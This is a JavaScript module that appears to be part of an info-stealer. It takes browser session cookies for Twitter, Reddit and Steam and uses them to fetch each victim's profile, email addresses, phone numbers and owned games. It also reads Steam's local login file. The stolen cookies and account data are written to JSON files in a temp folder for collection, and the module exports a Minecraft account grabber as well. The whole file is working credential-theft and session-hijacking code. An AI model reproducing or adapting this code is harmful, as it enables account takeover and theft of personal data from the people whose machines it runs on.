const axios = require('axios');
const { getCookies } = require('../util/cookies');
const { writeFileSync } = require('fs');
const { join } = require('path');
const fs = require('fs');
const { getTempFolder } = require('../util/init');

const twitter = async () => {
  const cookies = await getCookies();
  if (!cookies && !cookies?.find(cookie => cookie.host?.includes('.twitter.com') && cookie.name === 'ct0')) return;
  const { value: ct0 } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
  const { value: authToken, source } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
  const config = {
    headers: {
      Cookie: `ct0=${ct0}; auth_token=${authToken}`,
      Host: 'twitter.com',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
      Accept: '*/*',
      'Accept-Language': 'fr-FR',
      'Accept-Encoding': 'gzip, deflate, br',
      Prefer: 'safe',
      authorization: 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
      'x-twitter-auth-type': 'OAuth2Session',
      'x-csrf-token': ct0,
      'x-twitter-client-language': 'en',
      'x-twitter-active-user': 'yes',
      Origin: 'https://twitter.com',
      Connection: 'keep-alive',
      Referer: 'https://twitter.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site'
    }
  };
  const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, config);
  const params = new URLSearchParams();
  params.set('variables', JSON.stringify({ screen_name: profile.screen_name, withSafetyModeUserFields: true }));
  params.set('features', JSON.stringify({
    hidden_profile_likes_enabled: false, hidden_profile_subscriptions_enabled: true,
    responsive_web_graphql_exclude_directive_enabled: true, verified_phone_label_enabled: false,
    subscriptions_verification_info_is_identity_verified_enabled: false,
    subscriptions_verification_info_verified_since_enabled: true, highlights_tweets_tab_ui_enabled: true,
    creator_subscriptions_tweet_preview_api_enabled: true,
    responsive_web_graphql_skip_user_profile_image_extensions_enabled: false,
    responsive_web_graphql_timeline_navigation_enabled: true
  }));
  const { data: user } = await axios.get(
    `https://twitter.com/i/api/graphql/SAMkL5y_N9pmahSw8yy6gw/UserByScreenName?${params.toString()}`, config
  );
  const { data: email } = await axios.get('https://twitter.com/i/api/1.1/users/email_phone_info.json', config);
  profile.emails = email.emails;
  profile.phones = email.phone_numbers;
  profile.user = user.data.user.result;
  profile.cookie = `ct0=${ct0}; auth_token=${authToken}`;
  profile.source = source;
  writeFileSync(join(getTempFolder(), 'Twitter.json'), JSON.stringify(profile));
};

const reddit = async () => {
  const cookies = await getCookies();
  if (!cookies && !cookies?.find(cookie => cookie.host.includes('.reddit.com'))) return;
  const { value: cookie, source } = cookies.find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
  const { data: bearer } = await axios.post('https://accounts.reddit.com/api/access_token', { scopes: ['*', 'email', 'pii'] }, {
    headers: { Cookie: `reddit_session=${cookie}`, Authorization: 'Basic b2hYcG9xclpZdWIxa2c6' }
  });
  const { data: account } = await axios.get('https://oauth.reddit.com/api/v1/me', {
    headers: { Authorization: `Bearer ${bearer.access_token}` }
  });
  account.cookie = cookie;
  account.source = source;
  writeFileSync(join(getTempFolder(), 'Reddit.json'), JSON.stringify(account));
};

const steam = async () => {
  const steamBasePath = join('C:', 'Program Files (x86)', 'Steam');
  if (fs.existsSync(steamBasePath) && fs.existsSync(join(steamBasePath, 'config')) && fs.existsSync(join(steamBasePath, 'config', 'loginusers.vdf'))) {
    fs.writeFileSync(join(getTempFolder(), 'Steam.json'), '[]');
    const accounts = fs.readFileSync(join(steamBasePath, 'config', 'loginusers.vdf'), 'utf8');
    const regex = /7656[0-9]{13}/gi;
    accounts.match(regex).map(async account => {
      const { response: accountInfo } = (await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`)).data;
      const { response: games } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`)).data;
      const { response: level } = (await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`)).data;

      const accountsFile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Steam.json'), 'utf8'));
      accountsFile.push({
        accountId: account, accountInfo, games, level
      });
      const cookies = await getCookies();
      if (cookies && cookies?.find(cookie => cookie.name === 'steamLoginSecure')) {
        const cookie = cookies.find(cookie => cookie.host.includes('steam') && cookie.name === 'steamLoginSecure');
        if (cookie && cookie.value && account) {
          const userId = cookie.value.match(regex)[0];
          const account = accountsFile.find(account => account.accountId === userId);
          if (account) {
            account.cookie = cookie.value;
            account.cookieSource = cookie.source;
          }
        }
      }
      fs.writeFileSync(join(getTempFolder(), 'Steam.json'), JSON.stringify(accountsFile));
    });
  }
};

module.exports = {
  twitter, reddit, steam, minecraft: () => require('../functions/grab-mc')
};
